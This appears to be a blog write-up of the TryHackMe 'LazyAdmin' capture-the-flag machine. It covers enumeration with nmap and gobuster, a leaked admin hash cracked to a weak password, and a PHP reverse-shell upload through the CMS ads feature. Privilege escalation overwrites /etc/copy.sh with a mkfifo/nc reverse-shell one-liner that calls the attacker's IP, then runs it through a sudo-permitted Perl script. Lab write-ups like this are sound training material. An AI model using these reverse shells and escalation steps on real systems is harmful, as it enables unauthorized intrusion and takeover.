---
title: TryHackMe - LazyAdmin
author: Bonface
date: 2024-02-24 00:00:00 +0000
categories:
  - TryHackMe
  - Easy
tags:
  - tryhackme
  - linux
  - nmap
  - privesc
  - ssh
  - http
  - gobuster
image:
  path: /assets/img/try%20hack%20me%20/Easy/LazyAdmin/0.jpeg
  alt: LazyAdmin
---

# LazyAdmin

Easy Linux machine to practice your skills.  

# Tasks

capture the user and root flag.  

# nmap

## ip `10.10.24.121`

## Command 
```sh
nmap -sV -sC -v 10.10.24.121
```
## Results
```sh
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
| 256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_ 256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open http Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# http_80

## ip `10.10.24.121`


To Do List
----------------------------------------------
- View the site
- source code
- Robots.txt
- gobuster



##  site

![](../assets/img/try_hack_me/Easy/LazyAdmin/1.png)


# gobuster

```sh
	gobuster dir -u http://10.10.24.121 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

## Results

```sh
/content
```


## /content
![](../assets/img/try_hack_me/Easy/LazyAdmin/2.png)

Nothing much so i run another gobuster on the directory hoping to find sub-directories  



## gobuster /content

## Command 
```sh
 gobuster dir -u http://10.10.10.216/content -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

```
![](../assets/img/try_hack_me/Easy/LazyAdmin/3.png)

```sh
/inc
```
![](../assets/img/try_hack_me/Easy/LazyAdmin/4.png)

![](../assets/img/try_hack_me/Easy/LazyAdmin/5.png)


![](../assets/img/try_hack_me/Easy/LazyAdmin/6.png)

admin = manager  
password = 42f749ade7f9e195bf475f37a44cafcb\\  
Decoding the password = Password123  

![](../assets/img/try_hack_me/Easy/LazyAdmin/7.png)

log in using the details.  
![](../assets/img/try_hack_me/Easy/LazyAdmin/8.png)

Let's look around searching for an exploit vector.  
![](../assets/img/try_hack_me/Easy/LazyAdmin/9.png)

Get a reverse shell script *php change the ip then copy paste it.  
Now go to 10.10.10.216/content/inc/ads/shell.php but first run nc on your machine
```sh
nc -nlvp 1234
```

*Machine just expired let me start it again Damn all that progress!!! 

## ip `10.10.66.184`

## Commands
will have to start all over again :
1. 10.10.66.184/content/as
2. user = manager
3. password = Password123
4. Upload the reverse shell on ads management room
5. nc -nvlp 1234
6. `http://10.10.66.184/content/inc/ads/shell.php`

**now we have a shell !!!**

![](../assets/img/try_hack_me/Easy/LazyAdmin/10.png)  

user flag = THM{...}  
![](../assets/img/try_hack_me/Easy/LazyAdmin/11.png)



# priv esc

First lets stablelize the shell.  
```sh
python3 -c'importpty;pty.spawn("/bin/bash")'
export TERM=xterm
```

![](../assets/img/try_hack_me/Easy/LazyAdmin/12.png)  
Let's first look at the backup.pl   
![](../assets/img/try_hack_me/Easy/LazyAdmin/13.png)  

Runs the command with root previlage and we can read and execute it.  
The script runs another script  
![](../assets/img/try_hack_me/Easy/LazyAdmin/14.png)


```sh
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.172.59 5554 >/tmp/f' >/etc/copy.sh
```
Run nc 
```sh
nc -nvlp 5554
```

On the machine run 
```sh
sudo /usr/bin/perl /home/itguy/backup.pl
```
Root flag = THM{...}  
![](../assets/img/try_hack_me/Easy/LazyAdmin/15.png)

